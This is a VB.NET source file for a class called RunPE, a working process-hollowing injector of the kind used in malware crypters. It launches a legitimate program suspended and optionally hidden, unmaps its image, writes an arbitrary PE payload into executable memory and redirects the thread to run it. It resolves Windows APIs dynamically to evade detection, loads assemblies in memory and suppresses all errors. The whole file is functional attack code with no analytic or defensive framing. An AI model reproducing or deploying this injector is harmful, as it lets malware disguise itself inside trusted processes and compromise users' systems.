Imports System
Imports System.Diagnostics
Imports System.Reflection
Imports System.Runtime.InteropServices
Imports System.Threading
Imports Microsoft.VisualBasic.CompilerServices

<StandardModule> _
Friend NotInheritable Class RunPE
	Private Delegate Function DelegateResumeThread(ByVal handle As IntPtr) As Integer

	Private Delegate Function DelegateWow64SetThreadContext(ByVal thread As IntPtr, ByVal context() As Integer) As Boolean

	Private Delegate Function DelegateSetThreadContext(ByVal thread As IntPtr, ByVal context() As Integer) As Boolean

	Private Delegate Function DelegateWow64GetThreadContext(ByVal thread As IntPtr, ByVal context() As Integer) As Boolean

	Private Delegate Function DelegateGetThreadContext(ByVal thread As IntPtr, ByVal context() As Integer) As Boolean

	Private Delegate Function DelegateVirtualAllocEx(ByVal handle As IntPtr, ByVal address As Integer, ByVal length As Integer, ByVal type As Integer, ByVal protect As Integer) As Integer

	Private Delegate Function DelegateWriteProcessMemory(ByVal process As IntPtr, ByVal baseAddress As Integer, ByVal buffer() As Byte, ByVal bufferSize As Integer, ByRef bytesWritten As Integer) As Boolean

	Private Delegate Function DelegateReadProcessMemory(ByVal process As IntPtr, ByVal baseAddress As Integer, ByRef buffer As Integer, ByVal bufferSize As Integer, ByRef bytesRead As Integer) As Boolean

	Private Delegate Function DelegateZwUnmapViewOfSection(ByVal process As IntPtr, ByVal baseAddress As Integer) As Integer

	Public Delegate Function DelegateCreateProcessA(ByVal applicationName As String, ByVal commandLine As String, ByVal processAttributes As IntPtr, ByVal threadAttributes As IntPtr, ByVal inheritHandles As Boolean, ByVal creationFlags As UInteger, ByVal environment As IntPtr, ByVal currentDirectory As String, ByRef startupInfo As STARTUP_INFORMATION, ByRef processInformation As PROCESS_INFORMATION) As Boolean

	<StructLayout(LayoutKind.Sequential, Pack := 1)> _
	Public Structure PROCESS_INFORMATION
		Public ProcessHandle As IntPtr

		Public ThreadHandle As IntPtr

		Public ProcessId As UInteger

		Public ThreadId As UInteger
	End Structure

	Public Structure STARTUP_INFORMATION
		Public cb As Integer

		Public lpReserved As String

		Public lpDesktop As String

		Public lpTitle As String

		Public dwX As Integer

		Public dwY As Integer

		Public dwXSize As Integer

		Public dwYSize As Integer

		Public dwXCountChars As Integer

		Public dwYCountChars As Integer

		Public dwFillAttribute As Integer

		Public dwFlags As Integer

		Public wShowWindow As Short

		Public cbReserved2 As Short

		Public lpReserved2 As Integer

		Public hStdInput As Integer

		Public hStdOutput As Integer

		Public hStdError As Integer
	End Structure

	Private Shared ReadOnly ResumeThread As DelegateResumeThread = LoadApi(Of DelegateResumeThread)("kernel32", "ResumeThread")

	Private Shared ReadOnly Wow64SetThreadContext As DelegateWow64SetThreadContext = LoadApi(Of DelegateWow64SetThreadContext)("kernel32", "Wow64SetThreadContext")

	Private Shared ReadOnly SetThreadContext As DelegateSetThreadContext = LoadApi(Of DelegateSetThreadContext)("kernel32", "SetThreadContext")

	Private Shared ReadOnly Wow64GetThreadContext As DelegateWow64GetThreadContext = LoadApi(Of DelegateWow64GetThreadContext)("kernel32", "Wow64GetThreadContext")

	Private Shared ReadOnly GetThreadContext As DelegateGetThreadContext = LoadApi(Of DelegateGetThreadContext)("kernel32", "GetThreadContext")

	Private Shared ReadOnly VirtualAllocEx As DelegateVirtualAllocEx = LoadApi(Of DelegateVirtualAllocEx)("kernel32", "VirtualAllocEx")

	Private Shared ReadOnly WriteProcessMemory As DelegateWriteProcessMemory = LoadApi(Of DelegateWriteProcessMemory)("kernel32", "WriteProcessMemory")

	Private Shared ReadOnly ReadProcessMemory As DelegateReadProcessMemory = LoadApi(Of DelegateReadProcessMemory)("kernel32", "ReadProcessMemory")

	Private Shared ReadOnly ZwUnmapViewOfSection As DelegateZwUnmapViewOfSection = LoadApi(Of DelegateZwUnmapViewOfSection)("ntdll", "ZwUnmapViewOfSection")

	Public Shared ReadOnly CreateProcessA As DelegateCreateProcessA = LoadApi(Of DelegateCreateProcessA)("kernel32", "CreateProcessA")

	Public Shared Sub Run3(ByVal data() As Byte)
		Try
			Dim thread As New Thread(AddressOf Run4)
			thread.SetApartmentState(ApartmentState.STA)
			thread.Start(data)
		Catch
		End Try
	End Sub

	Public Shared Sub Run4(ByVal o As Object)
		Try
			Dim entryPoint As MethodInfo = System.Reflection.Assembly.Load(DirectCast(o, Byte())).EntryPoint
			If entryPoint.GetParameters().Length = 1 Then
				entryPoint.Invoke(Nothing, New Object(0) { New String(){} })
			Else
				entryPoint.Invoke(Nothing, Nothing)
			End If
		Catch
		End Try
	End Sub

	Public Shared Function TryRun(ByVal path As String, ByVal cmd As String, ByVal data() As Byte, ByVal compatible As Boolean, ByVal hidden As Boolean, Optional ByVal Desktop As String = "", Optional ByVal PID As Integer = 0) As Integer
		Try
			Dim num As Integer = 1
			Do
				If Not HandleRun(path, cmd, data, compatible, hidden, Desktop, PID) Then
					num += 1
					Continue Do
				End If
				Return -1
			Loop While num <= 10
		Catch
		End Try
		Return 0
	End Function

	<DllImport("kernel32", SetLastError := True)> _
	Private Shared Function LoadLibraryA(<MarshalAs(UnmanagedType.VBByRefStr)> ByRef Name As String) As IntPtr
	End Function

	<DllImport("kernel32", CharSet := CharSet.Ansi, ExactSpelling := True, SetLastError := True)> _
	Private Shared Function GetProcAddress(ByVal hProcess As IntPtr, <MarshalAs(UnmanagedType.VBByRefStr)> ByRef Name As String) As IntPtr
	End Function

	Private Shared Function LoadApi(Of CreateApi)(ByVal name As String, ByVal method As String) As CreateApi
		Return Conversions.ToGenericParameter(Of CreateApi)(Marshal.GetDelegateForFunctionPointer(GetProcAddress(LoadLibraryA(name), method), GetType(CreateApi)))
	End Function

	Private Shared Function HandleRun(ByVal path As String, ByVal cmd As String, ByVal data() As Byte, ByVal compatible As Boolean, Optional ByVal hidden As Boolean = False, Optional ByVal Desktop As String = "", Optional ByVal PID As Integer = 0) As Boolean
		Dim text As String = $"""{path}"""
		Dim startupInfo As STARTUP_INFORMATION = Nothing
		Dim processInformation As PROCESS_INFORMATION = Nothing
		startupInfo.cb = Marshal.SizeOf(GetType(STARTUP_INFORMATION))
		If Desktop.Length > 0 Then
			startupInfo.lpDesktop = Desktop
		End If
		If hidden Then
			startupInfo.wShowWindow = 0
			startupInfo.dwFlags = 1
		End If
		Try
			If Not String.IsNullOrEmpty(cmd) Then
				text = text & " " & cmd
			End If
			Dim intPtr As IntPtr = Nothing
			If Not CreateProcessA(path, text, intPtr, intPtr, inheritHandles:= False, 4UI, System.IntPtr.Zero, Nothing, startupInfo, processInformation) Then
				Throw New Exception()
			End If
			Dim num As Integer = BitConverter.ToInt32(data, 60)
			Dim num2 As Integer = BitConverter.ToInt32(data, num + 52)
			Dim array(178) As Integer
			array(0) = 65538
			If System.IntPtr.Size = 4 Then
				If Not GetThreadContext(processInformation.ThreadHandle, array) Then
					Throw New Exception()
				End If
			ElseIf Not Wow64GetThreadContext(processInformation.ThreadHandle, array) Then
				Throw New Exception()
			End If
			Dim num3 As Integer = array(41)
			Dim buffer As Integer = Nothing
			Dim bytesRead As Integer = Nothing
			If Not ReadProcessMemory(processInformation.ProcessHandle, num3 + 8, buffer, 4, bytesRead) Then
				Throw New Exception()
			End If
			If num2 = buffer AndAlso ZwUnmapViewOfSection(processInformation.ProcessHandle, buffer) <> 0 Then
				Throw New Exception()
			End If
			Dim length As Integer = BitConverter.ToInt32(data, num + 80)
			Dim bufferSize As Integer = BitConverter.ToInt32(data, num + 84)
			Dim num4 As Integer = VirtualAllocEx(processInformation.ProcessHandle, num2, length, 12288, 64)
			Dim flag As Boolean = Nothing
			If (Not compatible) AndAlso num4 = 0 Then
				flag = True
				num4 = VirtualAllocEx(processInformation.ProcessHandle, 0, length, 12288, 64)
			End If
			If num4 = 0 Then
				Throw New Exception()
			End If
			If Not WriteProcessMemory(processInformation.ProcessHandle, num4, data, bufferSize, bytesRead) Then
				Throw New Exception()
			End If
			Dim num5 As Integer = num + 248
			Dim num6 As Short = BitConverter.ToInt16(data, num + 6)
			Dim num7 As Integer = num6 - 1
			For i As Integer = 0 To num7
				Dim num8 As Integer = BitConverter.ToInt32(data, num5 + 12)
				Dim num9 As Integer = BitConverter.ToInt32(data, num5 + 16)
				Dim srcOffset As Integer = BitConverter.ToInt32(data, num5 + 20)
				If num9 <> 0 Then
					Dim array2(num9 - 1) As Byte
					System.Buffer.BlockCopy(data, srcOffset, array2, 0, array2.Length)
					If Not WriteProcessMemory(processInformation.ProcessHandle, num4 + num8, array2, array2.Length, bytesRead) Then
						Throw New Exception()
					End If
				End If
				num5 += 40
			Next i
			Dim bytes() As Byte = BitConverter.GetBytes(num4)
			If Not WriteProcessMemory(processInformation.ProcessHandle, num3 + 8, bytes, 4, bytesRead) Then
				Throw New Exception()
			End If
			Dim num10 As Integer = BitConverter.ToInt32(data, num + 40)
			If flag Then
				num4 = num2
			End If
			array(44) = num4 + num10
			If System.IntPtr.Size = 4 Then
				If Not SetThreadContext(processInformation.ThreadHandle, array) Then
					Throw New Exception()
				End If
			ElseIf Not Wow64SetThreadContext(processInformation.ThreadHandle, array) Then
				Throw New Exception()
			End If
			If ResumeThread(processInformation.ThreadHandle) = -1 Then
				Throw New Exception()
			End If
			PID = CInt(processInformation.ProcessId)
		Catch
			Process.GetProcessById(CInt(processInformation.ProcessId))?.Kill()
			Dim result As Boolean = False

			Return result
		End Try
		Return True
	End Function
End Class